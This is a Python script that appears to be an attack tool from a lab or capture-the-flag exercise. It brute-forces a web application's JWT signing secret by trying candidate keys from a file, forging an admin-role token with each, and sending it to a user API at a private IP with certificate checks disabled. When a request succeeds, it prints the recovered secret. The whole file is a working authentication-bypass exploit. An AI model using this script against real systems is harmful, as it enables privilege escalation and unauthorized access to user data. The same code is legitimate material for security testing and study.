import jwt
import time
import requests
import urllib3

# Suppress SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def forge_token(secret, username="admin", role="Admin"):
    payload = {
        "sub": "1",
        "name": username,
        "role": role,
        "iss": "SecureWebApp",
        "aud": "SecureWebAppClient",
        "exp": int(time.time()) + 3600
    }
    # HS256 needs the secret as either string or bytes
    return jwt.encode(payload, secret, algorithm="HS256")

def validate_candidates(file_path, target_url):
    try:
        with open(file_path, "r") as f:
            candidates = [line.strip() for line in f if len(line.strip()) == 44]
            
        print(f"Testing {len(candidates)} candidates against {target_url}...")
        
        for secret in candidates:
            try:
                token = forge_token(secret)
                headers = {"Authorization": f"Bearer {token}"}
                response = requests.get(target_url, headers=headers, verify=False, timeout=2)
                
                if response.status_code == 200:
                    print(f"\n[!] VALID SECRET FOUND: {secret}")
                    print(f"Response: {response.text[:200]}...")
                    return secret
                elif response.status_code == 401:
                    # Token invalid
                    pass
                else:
                    # Other status codes
                    # print(f"Secret {secret} returned {response.status_code}")
                    pass
            except Exception as e:
                # print(f"Error testing {secret}: {e}")
                pass
                
    except FileNotFoundError:
        print(f"File {file_path} not found.")

if __name__ == "__main__":
    url = "https://192.168.56.137/backend/api/users"
    validate_candidates("candidates.txt", url)
